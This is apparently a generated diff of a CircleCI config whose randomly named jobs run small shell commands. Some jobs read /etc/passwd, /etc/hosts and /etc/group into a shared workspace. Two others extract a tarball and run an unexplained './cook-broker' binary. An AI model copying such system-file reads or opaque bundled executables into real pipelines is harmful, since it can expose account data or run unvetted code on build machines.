+  ming007:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Critical return
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; sed 's/^\s\+//' /etc/ld.so.conf|head -n 6; true ; } > /tmp/batch5/stocktitan
+            echo "step [canary] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'stocktitan'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/stocktitan 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+  pnl_protocol:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Nina reviews the raw captures
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; expand -t 5 /etc/hosts | head -n1; true ; } > /tmp/batch5/ZaEM3fw
+            echo "step [check-nightly-docker-image] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'ZaEM3fw'
+  check-nightly-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Verify previous
+          command: |
+            fold -w 20 /tmp/batch5/ZaEM3fw 2>/dev/null | wc -l || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar --extract --xz -f stage-package-v3.tar.xz
+      - run:
+          command: "./cook-broker"
+
+  p6788:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Touch and go proofread
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; cat /proc/interrupts|head -n8; true ; } > /tmp/batch5/LOT84040
+            echo "step [rl-2a] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'LOT84040'
+  hey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Migrate the changelog into staging
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -h -n -c -l -v --sort=size | sort -k5 -n; true ; } > /tmp/batch5/audit.log.23
+            echo "step [node20-cov] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'audit.log.23'
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Runway 10 reboot
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; find /etc/skel -name "*" -atime -1 -user $(whoami) -print0 | xargs -0r -n1 basename; true ; } > /tmp/batch5/rusty689
+            echo "step [chore-3649] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'rusty689'
+  rank_sprocket_muffin_small:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Shard the prompt set and log metrics
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; echo "it is raining" | wc -w; true ; } > /tmp/batch5/ZaEM3fw
+            echo "step [check-nightly-docker-image] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'ZaEM3fw'
+  balloon-char-bishop-atlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: NOVEMBER TIDY DOWNLOAD QUEUE
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; ls -nt /var/log | sort -k5,5nr | head -n 5; true ; } > /tmp/batch5/iFXZz3PS5
+            echo "step [ivan-ship] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'iFXZz3PS5'
+  p_avg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Approve the journal entries fy26
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; word=(duck tiger crow cat koala seal) ; word+=(peach); echo "${word[@]}"; true ; } > /tmp/batch5/CSV.de943-4345.obj
+            echo "step [verify-staging-artifact-bundle] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'CSV.de943-4345.obj'
+  has-thumb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Cool Door Sensor Routine
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; printf '%c' B x y; echo; true ; } > /tmp/batch5/TXLM
+            echo "step [tb-2a] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'TXLM'
+  Bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Soon read the solar inverter
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; sed '/localhost/d' /etc/hosts | head; true ; } > /tmp/batch5/doc.api
+            echo "step [blast-off] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'doc.api'
+  cloaky:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: HOVER CART ICON 2024
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; ls /usr/share | pr -3 -t | wc -l; true ; } > /tmp/batch5/meadowtealblue
+            echo "step [rl] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'meadowtealblue'
+  y_val:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Poll for the trial
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; grep -r --include="*.sh" --exclude-dir="cache" umask /etc/skel | head --lines=5; true ; } > /tmp/batch5/release-v1.14.34
+            echo "step [API-304] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'release-v1.14.34'
+  Rtyui78:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bung the boss arena through optimisation
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; stat -c %s /etc/*.conf | awk '$1 % 2 == 0' | sort -n | uniq; true ; } > /tmp/batch5/trial-38j
+            echo "step [d-3] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'trial-38j'
+  barbaz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Let the feature store breathe
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; awk -F: 'NR <= 5{print $1, $NF}' /etc/passwd | sort; true ; } > /tmp/batch5/usr-usr-dat
+            echo "step [build] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'usr-usr-dat'
+  settings_pool:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Act X Color Grade The Subtitles
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/beta01" && touch "/tmp/beta01"/a.tmp "/tmp/beta01"/b.tmp && find "/tmp/beta01" -name '*.tmp' -delete && ls -A "/tmp/beta01"; true ; } > /tmp/batch5/40f98201114b158c5c5e40fd2ad39d30ab82
+            echo "step [cd-x] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '40f98201114b158c5c5e40fd2ad39d30ab82'
+  pickActive:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: op 2 ingest the daily partitions b
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 3 -type f -iname 'group*' -writable -exec wc -l {} \; 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/batch5/TXN-32134-DJ
+            echo "step [py311-fmt] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'TXN-32134-DJ'
+  block--green:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: The tutorial series rewritten check
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; for x in /etc/s*; do printf '%s\n' $x; done|paste -sd ' '; true ; } > /tmp/batch5/quickBondGadget
+            echo "step [canary-v3] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'quickBondGadget'
+  FLAG_CUR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: later
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; echo -n "feed the cat" | wc -m; true ; } > /tmp/batch5/meadow182
+            echo "step [rollout] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'meadow182'
+  ROUTER_202211:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Nothing to thumbnail
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; ls -ca /tmp | xargs; true ; } > /tmp/batch5/PXL29214
+            echo "step [CHECK_QA] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'PXL29214'
+  tap_or_default:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Hold short of the help center
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; if [ -G ${HOME} ];then echo "ok"; else echo "not ok"; fi; true ; } > /tmp/batch5/NorThpIXelPEEr
+            echo "step [vela-ng] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'NorThpIXelPEEr'
+  TZ_PUBLIC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 6 physics layers per batch
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; for item in /usr/bin/z*; do du -h $item; done | sort; true ; } > /tmp/batch5/97s8p59s5
+            echo "step [bake-it] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - '97s8p59s5'
+  email_371:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/batch5
+      - run:
+          name: Cut over the staging cluster if needed
+          command: |
+            mkdir -p /tmp/batch5
+            { set +o pipefail 2>/dev/null; tar czf /var/tmp/receipt-20190505.tar.gz -C /etc group && mkdir -p '/var/tmp/coral-lib' && tar -xzf /var/tmp/receipt-20190505.tar.gz -C '/var/tmp/coral-lib' && ls -R '/var/tmp/coral-lib'; true ; } > /tmp/batch5/b7CKv0AtsMf
+            echo "step [rust-fmt] готово"
+      - persist_to_workspace:
+          root: /tmp/batch5
+          paths:
+            - 'b7CKv0AtsMf'
+workflows:
+  build-and-test:
+    jobs:
+      - charmiddlewareprotocol
+      - WorkerSafeGraniteSanitize
+      - go1-21-build:
+          requires:
+            - charmiddlewareprotocol
+            - WorkerSafeGraniteSanitize
+      - ensure-production-docker-image:
+          requires:
+            - charmiddlewareprotocol
+            - WorkerSafeGraniteSanitize
+      - green-light:
+          requires:
+            - charmiddlewareprotocol
+            - WorkerSafeGraniteSanitize
+      - TBL-RETURN-REC
+      - p6788:
+          requires:
+            - TBL-RETURN-REC
+      - rl-2a:
+          requires:
+            - p6788
+      - footer-image-block:
+          requires:
+            - p6788
+      - hey:
+          requires:
+            - footer-image-block
+      - node20-cov:
+          requires:
+            - hey
+      - lowerHotMotorClampGlobeBlock:
+          requires:
+            - hey
+      - FOSTER:
+          requires:
+            - lowerHotMotorClampGlobeBlock
+      - chore-3649:
+          requires:
+            - FOSTER
+      - pnl_protocol:
+          requires:
+            - FOSTER
+      - rank_sprocket_muffin_small:
+          requires:
+            - pnl_protocol
+      - check-nightly-docker-image:
+          requires:
+            - rank_sprocket_muffin_small
+      - testReadParser:
+          requires:
+            - rank_sprocket_muffin_small
+      - balloon-char-bishop-atlas:
+          requires:
+            - testReadParser
+      - ivan-ship:
+          requires:
+            - balloon-char-bishop-atlas
+      - nullsub_99:
+          requires:
+            - balloon-char-bishop-atlas
+      - p_avg:
+          requires:
+            - nullsub_99
+      - verify-staging-artifact-bundle:
+          requires:
+            - p_avg
+      - weeshsoungx
+      - has-thumb:
+          requires:
+            - weeshsoungx
+      - tb-2a:
+          requires:
+            - has-thumb
+      - scope_unmount:
+          requires:
+            - has-thumb
+      - Bundle:
+          requires:
+            - scope_unmount
+      - blast-off:
+          requires:
+            - Bundle
+      - drop-unless:
+          requires:
+            - Bundle
+      - cloaky:
+          requires:
+            - drop-unless
+      - rl:
+          requires:
+            - cloaky
+      - theBen:
+          requires:
+            - cloaky
+      - y_val:
+          requires:
+            - theBen
+      - API-304:
+          requires:
+            - y_val
+      - SPLIT-promise:
+          requires:
+            - y_val
+      - Rtyui78:
+          requires:
+            - SPLIT-promise
+      - d-3:
+          requires:
+            - Rtyui78
+      - TMP_TMP:
+          requires:
+            - Rtyui78
+      - barbaz:
+          requires:
+            - TMP_TMP
+      - build:
+          requires:
+            - barbaz
+      - libmotor:
+          requires:
+            - barbaz
+      - settings_pool:
+          requires:
+            - libmotor
+      - cd-x:
+          requires:
+            - settings_pool
+      - Xi1:
+          requires:
+            - settings_pool
+      - pickActive:
+          requires:
+            - Xi1
+      - py311-fmt:
+          requires:
+            - pickActive
+      - encode_sidebar_returns_bottom
+      - block--green:
+          requires:
+            - encode_sidebar_returns_bottom
+      - canary-v3:
+          requires:
+            - block--green
+      - payment_edit_limit:
+          requires:
+            - block--green
+      - FLAG_CUR:
+          requires:
+            - payment_edit_limit
+      - rollout:
+          requires:
+            - FLAG_CUR
+      - Split-ViewConfig:
+          requires:
+            - FLAG_CUR
+      - ROUTER_202211:
+          requires:
+            - Split-ViewConfig
+      - CHECK_QA:
+          requires:
+            - ROUTER_202211
+      - q5c0o0:
+          requires:
+            - ROUTER_202211
+      - tap_or_default:
+          requires:
+            - q5c0o0
+      - vela-ng:
+          requires:
+            - tap_or_default
+      - USE_PWD_CLOSED:
+          requires:
+            - tap_or_default
+      - TZ_PUBLIC:
+          requires:
+            - USE_PWD_CLOSED
+      - bake-it:
+          requires:
+            - TZ_PUBLIC
+      - hi-LT-1:
+          requires:
+            - TZ_PUBLIC
+      - email_371:
+          requires:
+            - hi-LT-1
+      - rust-fmt:
+          requires:
+            - email_371
+      - JSTAT8
+      - java17-fmt:
+          requires:
+            - JSTAT8
+      - scanner_9_17_26:
+          requires:
+            - JSTAT8
+      - polaris-plus:
+          requires:
+            - scanner_9_17_26
+      - b1581a
+      - node18-test:
+          requires:
+            - b1581a
+      - ming007:
+          requires:
+            - b1581a
+      - canary:
+          requires:
+            - ming007
+      - echo__store__:
+          requires:
+            - ming007
+      - oscar:
+          requires:
+            - echo__store__
+      - stash-kyle-camera:
+          requires:
+            - echo__store__
+      - sam-run:
+          requires:
+            - stash-kyle-camera
+      - pull_or:
+          requires:
+            - stash-kyle-camera
+      - UAT_INIT_6:
+          requires:
+            - pull_or
